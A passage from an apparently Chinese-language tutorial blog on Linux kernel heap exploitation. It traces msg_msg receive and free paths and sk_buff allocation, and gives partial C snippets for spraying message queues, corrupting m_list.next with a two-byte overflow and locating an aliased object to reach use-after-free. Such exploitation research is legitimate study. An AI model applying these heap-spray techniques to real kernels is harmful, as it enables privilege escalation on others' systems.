+</span></span></code></pre></div><p><code>load_msg</code> 开头调用 <code>alloc_msg</code> 生成存储 dummy copy 的结构体对象。阅读 <code>alloc_msg</code> 的代码，这里我们可以看到在分配 dummy copy 使用的 <code>GFP_KERNEL_ACCOUNT</code> flag，代表这是个与用户数据相关联的对象。这个函数做的就是根据要拷贝的长度生成合适的 <code>msg_msg</code> 对象：</p><ul><li>如果 len &lt; DATALEN_MSG(0xFD0)，那么单个 <code>msg_msg</code> 就能装下，不需要设置 next 指针</li><li>如果 len > DATALEN_MSG(0xFD0)，那么就会生成一个合适的 <code>msg_msgseg</code> 链表</li></ul><p><code>load_msg</code> 后面会开始从真正的 <code>msg_msg</code> 中复制数据。然后会执行</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>err <span style=color:#666>=</span> <span style=color:#06287e>security_msg_msg_alloc</span>(msg);
+</span></span></code></pre></div><p>这里是 LSM（Linux Security Modules）的一个桩点。前面提到 <code>CONFIG_LSM</code> 就是因为我在这里被坑了—— SELinux 直接让他在这里出了段错误，还让我以为是 exp 写错了。</p><p>通过前面的 <code>prepare_copy</code> 后，会先找寻到 msqid 代表的消息队列，并从中找到对应的消息。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>mode <span style=color:#666>=</span> <span style=color:#06287e>convert_mode</span>(<span style=color:#666>&amp;</span>msgtyp, msgflg);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#06287e>rcu_read_lock</span>();
+</span></span><span style=display:flex><span>msq <span style=color:#666>=</span> <span style=color:#06287e>msq_obtain_object_check</span>(ns, msqid);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>IS_ERR</span>(msq)) {
+</span></span><span style=display:flex><span>        <span style=color:#06287e>rcu_read_unlock</span>();
+</span></span><span style=display:flex><span>        <span style=color:#06287e>free_copy</span>(copy);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>PTR_ERR</span>(msq);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (;;) {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_receiver msr_d;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        msg <span style=color:#666>=</span> <span style=color:#06287e>ERR_PTR</span>(<span style=color:#666>-</span>EACCES);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>ipcperms</span>(ns, <span style=color:#666>&amp;</span>msq<span style=color:#666>-&gt;</span>q_perm, S_IRUGO))
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> out_unlock1;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#06287e>ipc_lock_object</span>(<span style=color:#666>&amp;</span>msq<span style=color:#666>-&gt;</span>q_perm);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* raced with RMID? */</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span><span style=color:#06287e>ipc_valid_object</span>(<span style=color:#666>&amp;</span>msq<span style=color:#666>-&gt;</span>q_perm)) {
+</span></span><span style=display:flex><span>                msg <span style=color:#666>=</span> <span style=color:#06287e>ERR_PTR</span>(<span style=color:#666>-</span>EIDRM);
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> out_unlock0;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        msg <span style=color:#666>=</span> <span style=color:#06287e>find_msg</span>(msq, <span style=color:#666>&amp;</span>msgtyp, mode);
+</span></span></code></pre></div><p>如果找到了目标消息，进入下面的 if 中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span><span style=color:#06287e>IS_ERR</span>(msg)) {
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * Found a suitable message.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * Unlink it from the queue.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         */</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> ((bufsz <span style=color:#666>&lt;</span> msg<span style=color:#666>-&gt;</span>m_ts) <span style=color:#666>&amp;&amp;</span> <span style=color:#666>!</span>(msgflg <span style=color:#666>&amp;</span> MSG_NOERROR)) {
+</span></span><span style=display:flex><span>                msg <span style=color:#666>=</span> <span style=color:#06287e>ERR_PTR</span>(<span style=color:#666>-</span>E2BIG);
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> out_unlock0;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * If we are copying, then do not unlink message and do
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * not update queue parameters.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         */</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msgflg <span style=color:#666>&amp;</span> MSG_COPY) {
+</span></span><span style=display:flex><span>                msg <span style=color:#666>=</span> <span style=color:#06287e>copy_msg</span>(msg, copy);
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> out_unlock0;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#06287e>list_del</span>(<span style=color:#666>&amp;</span>msg<span style=color:#666>-&gt;</span>m_list);
+</span></span><span style=display:flex><span>        msq<span style=color:#666>-&gt;</span>q_qnum<span style=color:#666>--</span>;
+</span></span><span style=display:flex><span>        msq<span style=color:#666>-&gt;</span>q_rtime <span style=color:#666>=</span> <span style=color:#06287e>ktime_get_real_seconds</span>();
+</span></span><span style=display:flex><span>        <span style=color:#06287e>ipc_update_pid</span>(<span style=color:#666>&amp;</span>msq<span style=color:#666>-&gt;</span>q_lrpid, <span style=color:#06287e>task_tgid</span>(current));
+</span></span><span style=display:flex><span>        msq<span style=color:#666>-&gt;</span>q_cbytes <span style=color:#666>-=</span> msg<span style=color:#666>-&gt;</span>m_ts;
+</span></span><span style=display:flex><span>        <span style=color:#06287e>atomic_sub</span>(msg<span style=color:#666>-&gt;</span>m_ts, <span style=color:#666>&amp;</span>ns<span style=color:#666>-&gt;</span>msg_bytes);
+</span></span><span style=display:flex><span>        <span style=color:#06287e>atomic_dec</span>(<span style=color:#666>&amp;</span>ns<span style=color:#666>-&gt;</span>msg_hdrs);
+</span></span><span style=display:flex><span>        <span style=color:#06287e>ss_wakeup</span>(msq, <span style=color:#666>&amp;</span>wake_q, <span style=color:#007020>false</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>goto</span> out_unlock0;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里就会根据有没有指定 <code>MSG_COPY</code> flag 来选择是否 unlink 找到的 msg，如果指定了就会通过 <code>copy_msg</code> 函数把找到的 msg 的内容拷贝到之前分配的“dummy msg” <code>copy</code> 中，然后通过 goto 跳过 unlink。 <code>copy_msg</code> 的实现很 trivial，这里就不细说了。但是要注意他会把拷贝的目标返回，也就是这个函数会把 <code>copy</code> 返回，然后通过 <code>msg = copy(msg, copy)</code> 在 goto 之后就会 free 掉 <code>copy</code> 了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#002070;font-weight:700>out_unlock0</span>:
+</span></span><span style=display:flex><span>        <span style=color:#06287e>ipc_unlock_object</span>(<span style=color:#666>&amp;</span>msq<span style=color:#666>-&gt;</span>q_perm);
+</span></span><span style=display:flex><span>        <span style=color:#06287e>wake_up_q</span>(<span style=color:#666>&amp;</span>wake_q);
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>out_unlock1</span>:
+</span></span><span style=display:flex><span>        <span style=color:#06287e>rcu_read_unlock</span>();
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>IS_ERR</span>(msg)) {
+</span></span><span style=display:flex><span>                <span style=color:#06287e>free_copy</span>(copy);
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>PTR_ERR</span>(msg);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        bufsz <span style=color:#666>=</span> <span style=color:#06287e>msg_handler</span>(buf, msg, bufsz);
+</span></span><span style=display:flex><span>        <span style=color:#06287e>free_msg</span>(msg);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> bufsz;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里会通过回调来把 msg 里的内容拷贝到用户 buf 中。通过 <code>msgrcv</code> 系统调用进入会调用的是 <code>do_msg_fill</code> 。实现比较 trivial，就是一些 <code>copy_to_user</code> 。然后再通过 <code>free_msg</code> 把消息 free 掉</p><p><a id=code-snippet--free-msg></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>free_msg</span>(<span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>msg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msgseg <span style=color:#666>*</span>seg;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#06287e>security_msg_msg_free</span>(msg);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        seg <span style=color:#666>=</span> msg<span style=color:#666>-&gt;</span>next;
+</span></span><span style=display:flex><span>        <span style=color:#06287e>kfree</span>(msg);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>while</span> (seg <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>) {
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> msg_msgseg <span style=color:#666>*</span>tmp <span style=color:#666>=</span> seg<span style=color:#666>-&gt;</span>next;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#06287e>cond_resched</span>();
+</span></span><span style=display:flex><span>                <span style=color:#06287e>kfree</span>(seg);
+</span></span><span style=display:flex><span>                seg <span style=color:#666>=</span> tmp;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>从代码中可以发现整个过程中除了刚才提到的 LSM 之外并没有什么安全检查，在带上 <code>MSG_COPY</code> flag 时，也 <strong>不会使用</strong> 找到的 <code>msg_msg</code> 结构体的 <code>m_list</code> 这个字段。所以如果我们可以做到改大 <code>msg_msg</code> 的 <code>m_ts</code> 字段就可以做到越界读，非常好的一点是在读取 msg 的时候 ，所以不需要做 leak。另外如果能够同时控制 <code>msg_msg</code> 的 <code>next</code> 和 <code>m_ts</code> 字段，也可以做到任意地址读。</p><h3 id=msg-的发送><span class=section-num>2.3</span> msg 的发送</h3><p>用户需要发送的消息，在 <code>msgsnd</code> 系统调用过程中也会通过之前提到的 <code>load_msg</code> 函数来生成 <code>msg_msg</code> 结构体。而其他关于 msg 发送的实现，其实对于漏洞利用来说并不是很重要，这里就不再赘述。</p><p>另外需要注意的是，在发送 msg 的时候 msgtype 不能制定为 0，否则会失败。毕竟之前说了 <code>msgrcv</code> 的时候传入 <code>msgtype</code> 为 0 的时候是返回第一个消息，所以消息的类型不能设置为 0。</p><h3 id=堆喷的方式><span class=section-num>2.4</span> 堆喷的方式</h3><p>从上面我们可以看到， <code>msg_msg</code> 通过 <code>GPF_KERNEL_ACCOUNT</code> 分配，可以用于占位所有同样 flag 的堆块，并且在 linux 5.14 前没有和 <code>GFP_KERNEL</code> 隔离，此时也可以占位这些堆块。</p><p>通过堆喷，我们主要希望能把堆溢出和 double free 的问题转换成 UAF。</p><h4 id=溢出的-case><span class=section-num>2.4.1</span> 溢出的 case</h4><p>我们考虑可以堆溢出写 0 的 case：我们可以尝试覆盖 <code>msg_msg->m_list.next</code> 指针，这个指针在 <code>msg_msg</code> 链表中会指向消息队列中的下一个消息。通过写零就可以让他指向别的对象，然后通过 <code>msgrcv</code> 就可以把该对象 free 掉了。这样就可以做到 double free 和 UAF。由于 <code>msgrcv</code> 的实现中并没有什么合法性检查，被 free 对象只需要能够满足 <code>msg_msg->next</code> 字段为 0 就可以了。</p><p>溢出 3 字节以上范围太大，不好控制，我们选择溢出两字节，这样就可以让 <code>m_list.next</code> 指向每 0x10000 的首部了。堆喷时我们创建大量 <code>msg_qeuen</code> ，每个队列中创建两个消息，第一个消息大小 <code>(0x1000 - sizeof(struct msg_msg))</code> ，这样 <code>msg_msg</code> 结构体就正好占满了一页；第二个消息大小 <code>0x400 - sizeof(struct msg_msg)</code> ，这个大小是为了后续喷射 <code>pipe_buffer</code> 方便设置的，如果选用别的结构体辅助利用，也可以使用别的大小，只要满足能整除 0x1000 就可以了。然后通过溢出写零让 <code>m_list.next</code> 指向一个别的队列的第二个消息。这样我们就获得了两个指向同一个对象的指针。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>+----------------------------+              +---------------------------+
+</span></span><span style=display:flex><span>|cGRE     m_list.next        |------+------&gt;|cPNK  victim second msg    |
+</span></span><span style=display:flex><span>|   val=0xFFFFFFFFAA880000   |      |       |                           |
+</span></span><span style=display:flex><span>|      victim first msg      |      |       +---------------------------+
+</span></span><span style=display:flex><span>|                            |      |       |c1FF                       |
+</span></span><span style=display:flex><span>|                            |      |       |           ...             |
+</span></span><span style=display:flex><span>+----------------------------+      |       |                           |
+</span></span><span style=display:flex><span>|c1FF                        |      |       |                           |
+</span></span><span style=display:flex><span>|           ...              |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>|                            |      |       |                           |
+</span></span><span style=display:flex><span>+----------------------------+      |       +---------------------------+
+</span></span><span style=display:flex><span>|cRED     m_list.next        |------+       |cGRE                       |
+</span></span><span style=display:flex><span>|  oobed=0xFFFFFFFFAA880000  |              |   second msg of oobed msg |
+</span></span><span style=display:flex><span>|     oobed first msg        |              +---------------------------+
+</span></span><span style=display:flex><span>|                            |              |cGRE                       |
+</span></span><span style=display:flex><span>|                            |              |           ...             |
+</span></span><span style=display:flex><span>+----------------------------+              +---------------------------+
+</span></span></code></pre></div><p>获得了两个指针后，我们先通过搜索找出 <code>victim second msg</code> 的 <code>msqid</code> ，因为消息是我们写入的，所以可以像下面这样在之前喷射的时候给每个消息打上唯一的标签</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>secondMsgSend</span>(<span style=color:#902000>int</span> msgid, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>content, <span style=color:#902000>int</span> msgtype) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> second_msg msg;
+</span></span><span style=display:flex><span>  msg.message_type <span style=color:#666>=</span> msgtype;
+</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(msg.message, content, SECOND_MSG_SIZE);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgsnd</span>(msgid, <span style=color:#666>&amp;</span>msg, SECOND_MSG_SIZE, <span style=color:#40a070>0</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgsnd&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>  ((<span style=color:#902000>int</span> <span style=color:#666>*</span>)buf)[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> i;
+</span></span><span style=display:flex><span>  <span style=color:#06287e>secondMsgSend</span>(msgids[i], buf, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后通过 <code>MSG_COPY</code> 读出来。就可以获得 <code>victim</code> 和 <code>oobed</code> 消息的 <code>msqid</code> 了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// find the msg that can be uaf
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#902000>int</span> first_id <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>, second_id <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>%</span> HOLE_STEP <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>continue</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgrcv</span>(msgids[i], buf, SECOND_MSG_SIZE, <span style=color:#40a070>1</span>, MSG_COPY <span style=color:#666>|</span> IPC_NOWAIT) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgrcv&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (((<span style=color:#902000>int</span> <span style=color:#666>*</span>)buf)[<span style=color:#40a070>1</span>] <span style=color:#666>!=</span> i) {
+</span></span><span style=display:flex><span>    first_id <span style=color:#666>=</span> i;
+</span></span><span style=display:flex><span>    second_id <span style=color:#666>=</span> ((<span style=color:#902000>int</span> <span style=color:#666>*</span>)buf)[<span style=color:#40a070>1</span>];
+</span></span><span style=display:flex><span>    <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] found UAF target: first id 0x%x, second id 0x%x</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, first_id,
+</span></span><span style=display:flex><span>           second_id);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>找到了两个 id 之后，我们通过不带 <code>MSG_COPY</code> flag 的 <code>msgrcv</code> free 掉 <code>victim second msg</code> ，此时我们会丢失一个指向目标的指针，但是还残留了一个，通过这根指针就可以做到 UAF 了。</p><p>到这里基本就是使用 <code>msg_msg</code> 堆喷的方法了，在有堆溢出的情况下，可以把它转换成 UAF，然后通过别的结构体最后完成利用。</p><h4 id=double-free-的-case><span class=section-num>2.4.2</span> double free 的 case</h4><p>如果漏洞是一个 double free，需要首先看能被 double free 的 victim 对象的大小和 kmalloc 分配 flag，只要在 kmalloc-64 到 kmalloc-1024 中，并且没有与 <code>GFP_KERNEL_ACCOUNT</code> 隔离，就都可以尝试使用 <code>msg_msg</code> 占位，具体的，先 free 一次 victim 对象，然后喷射消息队列，仿照上面溢出的 case，也使用两个消息，第一个消息使用和 victim 不一样的大小，保证不会占位到 victim 中，第二个消息使用和 victim 同样的大小。占位成功后使用 double free 再 free 一次就同样可以实现 UAF 了。</p><p><a id="figure--fig: demo of double free msg-msg spary"></a></p><figure><img src=https://raw.githubusercontent.com/chujDK/ImageHost/main/PicGoIMage/msg_msg_spray.svg></figure><p>不过如果有 double free 并且条件合适，也许不需要使用 <code>msg_msg</code> 来堆喷，直接用后面要说的 <code>sk_buff</code> 堆喷就可以了（比如以 CVE-2021-22555 的利用来说，使用 <code>msg_msg</code> 其实就是为了把堆溢出转化为对 <code>sk_buff</code> 的一个类似于 double free 的效果并最后实现 UAF）。</p><h2 id=sk-buff-堆喷><span class=section-num>3</span> <code>sk_buff</code> 堆喷 <span class=tag><span class=exploit_trick>exploit-trick</span></span></h2><h3 id=结构体定义><span class=section-num>3.1</span> 结构体定义</h3><p><code>sk_buff</code> 在内核中用来表示网络中的一个数据包， <code>sk_buff</code> 本身并不存储数据包，但是会有四个指针指向数据包。 <code>sk_buff</code> 结构体定义比较庞大，但是我们实际利用时并不会对 <code>sk_buff</code> 动手，只会利用他指向的数据包而已。大致的结构为</p><p><a id="code-snippet--struct sk-buff"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// in strcut sk_buff
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>...
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* These elements must be at the end, see alloc_skb() for details.  */</span>
+</span></span><span style=display:flex><span><span style=color:#902000>sk_buff_data_t</span>		tail;
+</span></span><span style=display:flex><span><span style=color:#902000>sk_buff_data_t</span>		end;
+</span></span><span style=display:flex><span><span style=color:#902000>unsigned</span> <span style=color:#902000>char</span>		<span style=color:#666>*</span>head,
+</span></span><span style=display:flex><span>                        <span style=color:#666>*</span>data;
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>                                          +----------&gt;+-----------------------------+
+</span></span><span style=display:flex><span>                                          |           |cGRE                         |
+</span></span><span style=display:flex><span>+-----------------------------+           |           |            header           |
+</span></span><span style=display:flex><span>|c222                         |           |           |                             |
+</span></span><span style=display:flex><span>|             ...             |           |  +-------&gt;+-----------------------------+
+</span></span><span style=display:flex><span>|                             |           |  |        |cGRE                         |
+</span></span><span style=display:flex><span>+-----------------------------+           |  |        |                             |
+</span></span><span style=display:flex><span>|c1FF sk_buff_data_t tail     |-----------+  |        |                             |
+</span></span><span style=display:flex><span>+-----------------------------+              |        |                             |
+</span></span><span style=display:flex><span>|c1FF unsigned char data      |--------------+        |                             |
+</span></span><span style=display:flex><span>+-----------------------------+                       |             data            |
+</span></span><span style=display:flex><span>|c1FF sk_buff_data_t tail     |--------------+        |                             |
+</span></span><span style=display:flex><span>+-----------------------------+              |        |                             |
+</span></span><span style=display:flex><span>|c1FF sk_buff_data_t end      |-----------+  |        |                             |
+</span></span><span style=display:flex><span>+-----------------------------+           |  |        |                             |
+</span></span><span style=display:flex><span>|c222                         |           |  |        |                             |
+</span></span><span style=display:flex><span>|             ...             |           |  +-------&gt;+-----------------------------+
+</span></span><span style=display:flex><span>|                             |           |           |cGRE                         |
+</span></span><span style=display:flex><span>+-----------------------------+           |           |            footer           |
+</span></span><span style=display:flex><span>                                          |           |                             |
+</span></span><span style=display:flex><span>                                          +----------&gt;+-----------------------------+
+</span></span><span style=display:flex><span>                                                      |cRED                         |
+</span></span><span style=display:flex><span>                                                      |                             |
+</span></span><span style=display:flex><span>                                                      |   struct skb_shared_info    |
+</span></span><span style=display:flex><span>                                                      |           320byte           |
+</span></span><span style=display:flex><span>                                                      |                             |
+</span></span><span style=display:flex><span>                                                      |                             |
+</span></span><span style=display:flex><span>                                                      +-----------------------------+
+</span></span></code></pre></div><p>我们在利用时，使用的就是右侧他指向的数据包了。总的来说 <code>sk_buff</code> 的堆喷和 <code>msg_msg</code> 很像，不同点就在于他是尾部不可控，而 <code>msg_msg</code> 是头部不可控。同时 <code>sk_buff</code> 尾部会填充 320 byte 大小的 <code>struct skb_shared_info</code> ，这个是不可控的。由于尾部一定会填充 320 byte 的大小的数据，所以我们只能用它喷射 malloc-512 以上的堆块。</p><h3 id=分配-sk-buff><span class=section-num>3.2</span> 分配 <code>sk_buff</code></h3><p>从利用的角度来说，直接把 <code>sk_buff</code> 和他的数据包当成黑盒用来喷射其实就行，但是源码还是可以看一下的。</p><p>一个 network buffer 通过 <code>alloc_skb</code> 分配，该函数是 <code>__alloc_skb</code> 的 wrapper</p><p><a id=code-snippet--alloc-skb></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	__alloc_skb	-	allocate a network buffer
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@size: size to allocate
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@gfp_mask: allocation mask
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@flags: If SKB_ALLOC_FCLONE is set, allocate from fclone cache
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *		instead of head cache and allocate a cloned (child) skb.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *		If SKB_ALLOC_RX is set, __GFP_MEMALLOC will be used for
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *		allocations in case the data is required for writeback
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@node: numa node to allocate memory on
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	Allocate a new &amp;sk_buff. The returned buffer has no headroom and a
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	tail room of at least size bytes. The object has a reference count
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	of one. The return is the buffer. On a failure the return is %NULL.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	Buffers may only be allocated from interrupts using a @gfp_mask of
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	%GFP_ATOMIC.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span><span style=color:#06287e>__alloc_skb</span>(<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> size, <span style=color:#902000>gfp_t</span> gfp_mask,
+</span></span><span style=display:flex><span>                            <span style=color:#902000>int</span> flags, <span style=color:#902000>int</span> node)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> kmem_cache <span style=color:#666>*</span>cache;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> skb_shared_info <span style=color:#666>*</span>shinfo;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb;
+</span></span><span style=display:flex><span>        u8 <span style=color:#666>*</span>data;
+</span></span><span style=display:flex><span>        <span style=color:#902000>bool</span> pfmemalloc;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        cache <span style=color:#666>=</span> (flags <span style=color:#666>&amp;</span> SKB_ALLOC_FCLONE)
+</span></span><span style=display:flex><span>                <span style=color:#666>?</span> <span style=color:#002070;font-weight:700>skbuff_fclone_cache</span> : skbuff_head_cache;
+</span></span><span style=display:flex><span>
